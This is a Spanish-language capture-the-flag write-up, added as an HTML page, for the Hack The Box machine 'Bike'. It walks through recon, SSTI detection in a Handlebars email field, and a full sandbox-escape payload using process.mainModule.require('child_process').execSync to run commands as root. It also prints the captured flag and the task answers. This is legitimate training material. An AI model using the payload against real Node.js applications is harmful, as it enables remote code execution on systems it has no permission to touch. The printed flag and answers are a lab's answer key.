@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bike — HTB Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e17;
+    --surface: #111827;
+    --surface-alt: #0f1525;
+    --border: #1e293b;
+    --green: #22c55e;
+    --green-dim: #16a34a;
+    --green-glow: rgba(34, 197, 94, 0.15);
+    --red: #ef4444;
+    --red-dim: rgba(239, 68, 68, 0.12);
+    --blue: #3b82f6;
+    --blue-glow: rgba(59, 130, 246, 0.12);
+    --yellow: #eab308;
+    --yellow-glow: rgba(234, 179, 8, 0.12);
+    --purple: #a855f7;
+    --purple-glow: rgba(168, 85, 247, 0.12);
+    --orange: #f97316;
+    --orange-glow: rgba(249, 115, 22, 0.12);
+    --cyan: #06b6d4;
+    --text: #e2e8f0;
+    --text-dim: #94a3b8;
+    --text-muted: #64748b;
+    --font-mono: 'JetBrains Mono', monospace;
+    --font-sans: 'Space Grotesk', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-sans);
+    min-height: 100vh;
+    line-height: 1.7;
+  }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 24px 80px;
+  }
+
+  /* ── HEADER ── */
+  .header {
+    text-align: center;
+    margin-bottom: 48px;
+    padding-bottom: 32px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .header h1 {
+    font-size: 2.8rem;
+    font-weight: 700;
+    color: var(--green);
+    letter-spacing: -1px;
+    text-shadow: 0 0 40px var(--green-glow);
+    margin-bottom: 16px;
+  }
+
+  .header .machine-subtitle {
+    color: var(--text-dim);
+    font-size: 1rem;
+    margin-bottom: 20px;
+  }
+
+  .meta-tags {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    flex-wrap: wrap;
+  }
+
+  .tag {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 5px 14px;
+    border-radius: 20px;
+    font-size: 0.75rem;
+    font-family: var(--font-mono);
+    font-weight: 600;
+  }
+
+  .tag.os { background: var(--blue-glow); border: 1px solid rgba(59,130,246,0.3); color: var(--blue); }
+  .tag.difficulty { background: var(--green-glow); border: 1px solid rgba(34,197,94,0.3); color: var(--green); }
+  .tag.skill { background: var(--purple-glow); border: 1px solid rgba(168,85,247,0.3); color: var(--purple); }
+  .tag.skill2 { background: var(--orange-glow); border: 1px solid rgba(249,115,22,0.3); color: var(--orange); }
+  .tag.skill3 { background: var(--yellow-glow); border: 1px solid rgba(234,179,8,0.3); color: var(--yellow); }
+
+  /* ── TABLE OF CONTENTS ── */
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px 28px;
+    margin-bottom: 40px;
+  }
+
+  .toc h3 {
+    font-size: 0.75rem;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    color: var(--text-muted);
+    margin-bottom: 14px;
+    font-family: var(--font-mono);
+  }
+
+  .toc ul {
+    list-style: none;
+    display: grid;
+    gap: 6px;
+  }
+
+  .toc a {
+    color: var(--text-dim);
+    text-decoration: none;
+    font-size: 0.88rem;
+    padding: 4px 0;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    transition: color 0.2s;
+  }
+
+  .toc a:hover { color: var(--green); }
+
+  .toc a .toc-num {
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    color: var(--text-muted);
+    min-width: 24px;
+  }
+
+  /* ── SECTIONS ── */
+  .section {
+    margin-bottom: 48px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-icon {
+    font-size: 1.4rem;
+  }
+
+  .section-header h2 {
+    font-size: 1.4rem;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+  }
+
+  .section p {
+    color: var(--text-dim);
+    font-size: 0.92rem;
+    margin-bottom: 14px;
+    line-height: 1.8;
+  }
+
+  .section p strong {
+    color: var(--text);
+  }
+
+  /* ── CODE BLOCKS ── */
+  .code-block {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    margin: 16px 0;
+    overflow: hidden;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 16px;
+    background: var(--surface-alt);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: var(--font-mono);
+    font-size: 0.65rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+  }
+
+  .code-dots {
+    display: flex;
+    gap: 6px;
+  }
+
+  .code-dots span {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+  }
+
+  .code-dots span:nth-child(1) { background: #ef4444; }
+  .code-dots span:nth-child(2) { background: #eab308; }
+  .code-dots span:nth-child(3) { background: #22c55e; }
+
+  .code-block pre {
+    padding: 16px 20px;
+    overflow-x: auto;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    line-height: 1.7;
+    color: var(--text-dim);
+  }
+
+  .code-block pre .cmd { color: var(--green); }
+  .code-block pre .flag { color: var(--yellow); }
+  .code-block pre .output { color: var(--text-muted); }
+  .code-block pre .important { color: var(--red); }
+  .code-block pre .highlight { color: var(--cyan); background: rgba(6, 182, 212, 0.08); padding: 1px 4px; border-radius: 3px; }
+  .code-block pre .comment { color: var(--text-muted); font-style: italic; }
+  .code-block pre .user { color: var(--purple); }
+  .code-block pre .string { color: var(--orange); }
+
+  /* ── INFO BOXES ── */
+  .info-box {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 16px 0;
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+  }
+
+  .info-box .info-icon {
+    font-size: 1.2rem;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  .info-box p {
+    margin: 0;
+    font-size: 0.85rem;
+    color: var(--text-dim);
+  }
+
+  .info-box.tip { border-left: 3px solid var(--green); }
+  .info-box.warning { border-left: 3px solid var(--yellow); }
+  .info-box.danger { border-left: 3px solid var(--red); }
+  .info-box.note { border-left: 3px solid var(--blue); }
+
+  /* ── PORTS GRID ── */
+  .ports-grid {
+    display: grid;
+    gap: 8px;
+    margin: 14px 0;
+  }
+
+  .port-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 16px;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+  }
+
+  .port-num {
+    font-weight: 700;
+    min-width: 50px;
+  }
+
+  .port-service { color: var(--text-dim); flex: 1; }
+
+  .port-access {
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-size: 0.65rem;
+    font-weight: 600;
+  }
+
+  .port-access.external { background: var(--green-glow); color: var(--green); border: 1px solid rgba(34,197,94,0.2); }
+
+  /* ── TECH STACK ── */
+  .tech-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 8px;
+    margin: 14px 0;
+  }
+
+  .tech-chip {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 14px;
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    color: var(--text-dim);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .tech-chip .dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+  }
+
+  /* ── SSTI FLOW DIAGRAM ── */
+  .ssti-diagram {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 28px 20px;
+    margin: 20px 0;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .ssti-diagram::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: 
+      radial-gradient(ellipse at 20% 50%, var(--orange-glow) 0%, transparent 50%),
+      radial-gradient(ellipse at 80% 50%, var(--red-dim) 0%, transparent 50%);
+    pointer-events: none;
+  }
+
+  .ssti-flow {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    flex-wrap: wrap;
+    position: relative;
+    z-index: 1;
+    font-family: var(--font-mono);
+    font-size: 0.8rem;
+  }
+
+  .flow-item {
+    padding: 8px 14px;
+    border-radius: 8px;
+    font-weight: 600;
+  }
+
+  .flow-item.attacker { background: var(--blue-glow); border: 1px solid rgba(59,130,246,0.3); color: var(--blue); }
+  .flow-item.burp { background: var(--orange-glow); border: 1px solid rgba(249,115,22,0.3); color: var(--orange); }
+  .flow-item.server { background: var(--red-dim); border: 1px solid rgba(239,68,68,0.3); color: var(--red); }
+  .flow-item.template { background: var(--purple-glow); border: 1px solid rgba(168,85,247,0.3); color: var(--purple); }
+  .flow-item.rce { background: var(--green-glow); border: 1px solid rgba(34,197,94,0.3); color: var(--green); }
+
+  .flow-arrow {
+    color: var(--text-muted);
+    font-size: 1.2rem;
+  }
+
+  /* ── TASKS TABLE ── */
+  .tasks-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    font-size: 0.85rem;
+  }
+
+  .tasks-table th {
+    text-align: left;
+    padding: 10px 16px;
+    background: var(--surface-alt);
+    border: 1px solid var(--border);
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-muted);
+  }
+
+  .tasks-table td {
+    padding: 10px 16px;
+    border: 1px solid var(--border);
+    background: var(--surface);
+    font-size: 0.8rem;
+    color: var(--text-dim);
+  }
+
+  .tasks-table td:last-child {
+    font-family: var(--font-mono);
+    color: var(--green);
+    font-weight: 600;
+  }
+
+  /* ── FLAG ── */
+  .flag-box {
+    background: var(--surface);
+    border: 2px solid var(--green);
+    border-radius: 12px;
+    padding: 24px;
+    text-align: center;
+    margin: 24px 0;
+    box-shadow: 0 0 40px var(--green-glow);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .flag-box::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse at center, var(--green-glow) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .flag-box .flag-label {
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    color: var(--green-dim);
+    margin-bottom: 10px;
+    position: relative;
+  }
+
+  .flag-box .flag-value {
+    font-family: var(--font-mono);
+    font-size: 1.1rem;
+    font-weight: 700;
+    color: var(--green);
+    position: relative;
+    word-break: break-all;
+  }
+
+  /* ── LESSONS ── */
+  .lessons-grid {
+    display: grid;
+    gap: 12px;
+    margin-top: 16px;
+  }
+
+  .lesson {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px 20px;
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+  }
+
+  .lesson-num {
+    flex-shrink: 0;
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: var(--green-glow);
+    border: 1px solid rgba(34, 197, 94, 0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    font-weight: 700;
+    color: var(--green);
+  }
+
+  .lesson p {
+    margin: 0;
+    font-size: 0.85rem;
+    color: var(--text-dim);
+    line-height: 1.6;
+  }
+
+  .lesson p strong { color: var(--text); }
+
+  /* ── FOOTER ── */
+  .footer {
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    color: var(--text-muted);
+  }
+
+  @media (max-width: 600px) {
+    .header h1 { font-size: 2rem; }
+    .ssti-flow { flex-direction: column; }
+    .flow-arrow { transform: rotate(90deg); }
+    .tech-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- ═══════════ HEADER ═══════════ -->
+  <div class="header">
+    <h1>Bike</h1>
+    <p class="machine-subtitle">Hack The Box — Starting Point</p>
+    <div class="meta-tags">
+      <span class="tag os">🐧 Linux</span>
+      <span class="tag difficulty">Very Easy</span>
+      <span class="tag skill">SSTI</span>
+      <span class="tag skill2">Burp Suite</span>
+      <span class="tag skill3">Node.js / Handlebars</span>
+    </div>
+  </div>
+
+  <!-- ═══════════ TABLE OF CONTENTS ═══════════ -->
+  <div class="toc">
+    <h3>Índice</h3>
+    <ul>
+      <li><a href="#recon"><span class="toc-num">01</span> Reconocimiento / Enumeración</a></li>
+      <li><a href="#webapp"><span class="toc-num">02</span> Exploración de la Aplicación Web</a></li>
+      <li><a href="#ssti"><span class="toc-num">03</span> Detección de SSTI</a></li>
+      <li><a href="#burp"><span class="toc-num">04</span> Explotación con Burp Suite</a></li>
+      <li><a href="#sandbox"><span class="toc-num">05</span> Bypass del Sandbox</a></li>
+      <li><a href="#flag"><span class="toc-num">06</span> Captura de la Flag</a></li>
+      <li><a href="#tasks"><span class="toc-num">07</span> Respuestas a las Tasks</a></li>
+      <li><a href="#lessons"><span class="toc-num">08</span> Lecciones Aprendidas</a></li>
+    </ul>
+  </div>
+
+  <!-- ═══════════ 1. RECONOCIMIENTO ═══════════ -->
+  <div class="section" id="recon">
+    <div class="section-header">
+      <span class="section-icon">🔍</span>
+      <h2>1. Reconocimiento / Enumeración</h2>
+    </div>
+
+    <p>Empezamos con un escaneo de puertos usando <strong>nmap</strong> con scripts por defecto (<code>-sC</code>) y detección de versiones (<code>-sV</code>).</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bash</span>
+      </div>
+      <pre><span class="cmd">sudo nmap -sC -sV</span> <span class="flag">{target_IP}</span></pre>
+    </div>
+
+    <p>El escaneo revela <strong>2 puertos abiertos</strong>:</p>
+
+    <div class="ports-grid">
+      <div class="port-row">
+        <span class="port-num" style="color: var(--green);">22</span>
+        <span class="port-service">OpenSSH 8.2p1 (SSH)</span>
+        <span class="port-access external">Externo</span>
+      </div>
+      <div class="port-row">
+        <span class="port-num" style="color: var(--green);">80</span>
+        <span class="port-service">Node.js (Express — HTTP)</span>
+        <span class="port-access external">Externo</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════ 2. WEBAPP ═══════════ -->
+  <div class="section" id="webapp">
+    <div class="section-header">
+      <span class="section-icon">🌐</span>
+      <h2>2. Exploración de la Aplicación Web</h2>
+    </div>
+
+    <p>Al acceder a <code>http://{target_IP}</code> encontramos una página con un formulario de suscripción por email. Usando <strong>Wappalyzer</strong> confirmamos el stack tecnológico:</p>
+
+    <div class="tech-grid">
+      <div class="tech-chip">
+        <span class="dot" style="background: var(--green); box-shadow: 0 0 6px var(--green);"></span>
+        Node.js — Runtime
+      </div>
+      <div class="tech-chip">
+        <span class="dot" style="background: var(--blue); box-shadow: 0 0 6px var(--blue);"></span>
+        Express — Framework
+      </div>
+      <div class="tech-chip">
+        <span class="dot" style="background: var(--orange); box-shadow: 0 0 6px var(--orange);"></span>
+        Handlebars — Template Engine
+      </div>
+    </div>
+
+    <div class="info-box note">
+      <span class="info-icon">📘</span>
+      <p><strong>Handlebars</strong> es un motor de plantillas para Node.js. Genera HTML dinámicamente insertando datos en plantillas. Si la entrada del usuario se inserta directamente en la plantilla sin sanitizar, es vulnerable a <strong>SSTI</strong> (Server-Side Template Injection).</p>
+    </div>
+  </div>
+
+  <!-- ═══════════ 3. SSTI ═══════════ -->
+  <div class="section" id="ssti">
+    <div class="section-header">
+      <span class="section-icon">💉</span>
+      <h2>3. Detección de SSTI</h2>
+    </div>
+
+    <p>Para verificar si el formulario es vulnerable a <strong>Server-Side Template Injection</strong>, inyectamos una expresión de plantilla en el campo de email:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">payload — campo email</span>
+      </div>
+      <pre><span class="important">{{7*7}}</span></pre>
+    </div>
+
+    <p>Si la respuesta devuelve <strong>49</strong>, el servidor está evaluando nuestra entrada como código de plantilla. Si devuelve un error mencionando <strong>Handlebars</strong> y la ruta <code>/root/Backend</code>, también confirma la vulnerabilidad y nos revela información interna.</p>
+
+    <div class="info-box warning">
+      <span class="info-icon">⚠️</span>
+      <p>El mensaje de error expone que Handlebars está en <code>/root/Backend</code> — esto indica que el servidor corre como <strong>root</strong>. Cualquier comando que ejecutemos tendrá privilegios máximos.</p>
+    </div>
+
+    <p>El flujo de un ataque SSTI es el siguiente:</p>
+
+    <div class="ssti-diagram">
+      <div class="ssti-flow">
+        <div class="flow-item attacker">🐧 Atacante</div>
+        <span class="flow-arrow">→</span>
+        <div class="flow-item burp">🔧 Burp Suite</div>
+        <span class="flow-arrow">→</span>
+        <div class="flow-item server">🖥️ Express</div>
+        <span class="flow-arrow">→</span>
+        <div class="flow-item template">📝 Handlebars</div>
+        <span class="flow-arrow">→</span>
+        <div class="flow-item rce">💀 RCE como root</div>
+      </div>
+    </div>
+
+    <div class="info-box tip">
+      <span class="info-icon">💡</span>
+      <p><strong>¿Qué es SSTI?</strong> — Server-Side Template Injection ocurre cuando la entrada del usuario se inserta directamente en una plantilla del servidor sin sanitizar. El motor evalúa la entrada como código, permitiendo al atacante ejecutar expresiones arbitrarias y, en muchos casos, comandos del sistema.</p>
+    </div>
+  </div>
+
+  <!-- ═══════════ 4. BURP SUITE ═══════════ -->
+  <div class="section" id="burp">
+    <div class="section-header">
+      <span class="section-icon">🔧</span>
+      <h2>4. Explotación con Burp Suite</h2>
+    </div>
+
+    <p>Para manipular la petición POST del formulario, necesitamos <strong>Burp Suite</strong> como proxy de interceptación.</p>
+
+    <p><strong>Paso 1</strong> — Configurar el proxy del navegador (con FoxyProxy o manualmente) para que pase por Burp.</p>
+
+    <p><strong>Paso 2</strong> — Enviar el formulario de email e interceptar la petición POST en Burp.</p>
+
+    <p><strong>Paso 3</strong> — Enviar la petición al <strong>Repeater</strong> con <code>Ctrl+R</code>.</p>
+
+    <p>Desde <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank" style="color: var(--cyan);">HackTricks — SSTI</a>, encontramos un payload para Handlebars (NodeJS) que usa <code>require</code> para ejecutar comandos:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">payload inicial — hacktricks</span>
+      </div>
+      <pre><span class="comment">// Línea clave dentro del payload de Handlebars</span>
+<span class="important">return require('child_process').exec('whoami');</span></pre>
+    </div>
+
+    <p>Al enviarlo URL-encodeado en el parámetro <code>email=</code>, obtenemos un error:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">respuesta del servidor</span>
+      </div>
+      <pre><span class="important">ReferenceError: require is not defined</span></pre>
+    </div>
+
+    <div class="info-box danger">
+      <span class="info-icon">🚫</span>
+      <p>El entorno está en <strong>sandbox</strong> — <code>require()</code> no está disponible directamente. Handlebars restringe el acceso a funciones del sistema. Necesitamos encontrar una forma de escapar del sandbox.</p>
+    </div>
+  </div>
+
+  <!-- ═══════════ 5. SANDBOX BYPASS ═══════════ -->
+  <div class="section" id="sandbox">
+    <div class="section-header">
+      <span class="section-icon">🔓</span>
+      <h2>5. Bypass del Sandbox</h2>
+    </div>
+
+    <p>La clave para escapar del sandbox de Handlebars es acceder a <code>require</code> a través del objeto global <strong>process</strong> de Node.js. Aunque <code>require</code> no está definido directamente, podemos llegar a él mediante:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">bypass</span>
+      </div>
+      <pre><span class="cmd">process</span>.mainModule.<span class="cmd">require</span>(<span class="string">'child_process'</span>).<span class="cmd">execSync</span>(<span class="string">'&lt;COMANDO&gt;'</span>)</pre>
+    </div>
+
+    <div class="info-box note">
+      <span class="info-icon">📘</span>
+      <p><strong>process</strong> es la variable del scope top-level (global) en Node.js. Proporciona información y control sobre el proceso actual. A través de <code>process.mainModule.require</code> podemos cargar módulos del sistema, eludiendo las restricciones del sandbox de Handlebars.</p>
+    </div>
+
+    <p>El payload completo de Handlebars SSTI queda así:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">handlebars — payload completo</span>
+      </div>
+      <pre><span class="comment">{{#with "s" as |string|}}</span>
+  <span class="comment">{{#with "e"}}</span>
+    <span class="comment">{{#with split as |conslist|}}</span>
+      <span class="comment">{{this.pop}}</span>
+      <span class="comment">{{this.push (lookup string.sub "constructor")}}</span>
+      <span class="comment">{{this.pop}}</span>
+      <span class="comment">{{#with string.split as |codelist|}}</span>
+        <span class="comment">{{this.pop}}</span>
+        <span class="comment">{{this.push "</span><span class="highlight">return process.mainModule.require('child_process').execSync('whoami');</span><span class="comment">"}}</span>
+        <span class="comment">{{this.pop}}</span>
+        <span class="comment">{{#each conslist}}</span>
+          <span class="comment">{{#with (string.sub.apply 0 codelist)}}</span>
+            <span class="comment">{{this}}</span>
+          <span class="comment">{{/with}}</span>
+        <span class="comment">{{/each}}</span>
+      <span class="comment">{{/with}}</span>
+    <span class="comment">{{/with}}</span>
+  <span class="comment">{{/with}}</span>
+<span class="comment">{{/with}}</span></pre>
+    </div>
+
+    <p><strong>Proceso de envío:</strong></p>
+
+    <p><strong>1.</strong> Copiar el payload y llevarlo a la pestaña <strong>Decoder</strong> de Burp Suite.</p>
+
+    <p><strong>2.</strong> Seleccionar <strong>Encode as → URL</strong> para codificarlo correctamente.</p>
+
+    <p><strong>3.</strong> En el <strong>Repeater</strong>, reemplazar el valor de <code>email=</code> con el payload URL-encodeado.</p>
+
+    <p><strong>4.</strong> Hacer clic en <strong>Send</strong>.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">respuesta del servidor</span>
+      </div>
+      <pre><span class="comment">// Resultado del whoami en la respuesta HTTP</span>
+<span class="highlight">root</span></pre>
+    </div>
+
+    <div class="info-box tip">
+      <span class="info-icon">✅</span>
+      <p><strong>RCE confirmado como root.</strong> Tenemos ejecución remota de comandos con el máximo nivel de privilegios. Ahora solo queda leer la flag.</p>
+    </div>
+  </div>
+
+  <!-- ═══════════ 6. FLAG ═══════════ -->
+  <div class="section" id="flag">
+    <div class="section-header">
+      <span class="section-icon">🏁</span>
+      <h2>6. Captura de la Flag</h2>
+    </div>
+
+    <p>Sustituimos <code>whoami</code> por el comando para leer la flag en el payload:</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">comando — dentro del payload</span>
+      </div>
+      <pre><span class="comment">// Reemplazar la línea del execSync:</span>
+return process.mainModule.require(<span class="string">'child_process'</span>).execSync(<span class="string">'<span class="highlight">cat /root/flag.txt</span>'</span>);</pre>
+    </div>
+
+    <p>Repetimos el proceso: URL-encode → pegar en <code>email=</code> → Send. La flag aparece en la respuesta.</p>
+
+    <div class="flag-box">
+      <div class="flag-label">🏴 Flag Capturada</div>
+      <div class="flag-value">6b258d726d287462d60c103d0142a81c</div>
+    </div>
+  </div>
+
+  <!-- ═══════════ 7. TASKS ═══════════ -->
+  <div class="section" id="tasks">
+    <div class="section-header">
+      <span class="section-icon">📝</span>
+      <h2>7. Respuestas a las Tasks</h2>
+    </div>
+
+    <table class="tasks-table">
+      <tr><th>#</th><th>Pregunta</th><th>Respuesta</th></tr>
+      <tr><td>1</td><td>Puertos TCP abiertos</td><td>22,80</td></tr>
+      <tr><td>2</td><td>Software en el puerto HTTP</td><td>Node.js</td></tr>
+      <tr><td>3</td><td>Web Framework según Wappalyzer</td><td>Express</td></tr>
+      <tr><td>4</td><td>Tipo de encoding usado para el payload</td><td>URL</td></tr>
+      <tr><td>5</td><td>¿Qué es "not defined" en el error?</td><td>require</td></tr>
+      <tr><td>6</td><td>Variable del scope top-level en Node.js</td><td>global</td></tr>
+      <tr><td>7</td><td>Usuario del webserver</td><td>root</td></tr>
+    </table>
+  </div>
+
+  <!-- ═══════════ 8. LECCIONES ═══════════ -->
+  <div class="section" id="lessons">
+    <div class="section-header">
+      <span class="section-icon">📚</span>
+      <h2>8. Lecciones Aprendidas</h2>
+    </div>
+
+    <div class="lessons-grid">
+      <div class="lesson">
+        <div class="lesson-num">1</div>
+        <p><strong>SSTI (Server-Side Template Injection)</strong> — Siempre probar expresiones como <code>{{7*7}}</code> en campos de entrada de aplicaciones web. Si el servidor evalúa la expresión, es vulnerable.</p>
+      </div>
+      <div class="lesson">
+        <div class="lesson-num">2</div>
+        <p><strong>Identificar el Template Engine</strong> — Los mensajes de error a menudo revelan el motor de plantillas (Handlebars, Jinja2, Twig...). Cada uno tiene payloads específicos. <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank" style="color: var(--cyan);">HackTricks</a> es un recurso excelente.</p>
+      </div>
+      <div class="lesson">
+        <div class="lesson-num">3</div>
+        <p><strong>URL Encoding</strong> — Al enviar payloads por HTTP, los caracteres especiales deben codificarse en URL. Burp Suite tiene un encoder integrado en la pestaña Decoder.</p>
+      </div>
+      <div class="lesson">
+        <div class="lesson-num">4</div>
+        <p><strong>Sandbox Escape en Node.js</strong> — Cuando <code>require</code> no está disponible, el objeto global <code>process.mainModule</code> permite acceder a módulos del sistema y escapar del sandbox.</p>
+      </div>
+      <div class="lesson">
+        <div class="lesson-num">5</div>
+        <p><strong>Principio de mínimo privilegio</strong> — El servidor corriendo como <strong>root</strong> amplifica cualquier vulnerabilidad. Un servicio web nunca debería ejecutarse con privilegios de administrador.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════ FOOTER ═══════════ -->
+  <div class="footer">
+    HTB Bike Writeup · Máquina completada
+  </div>
+
+</div>
+</body>
+</html>
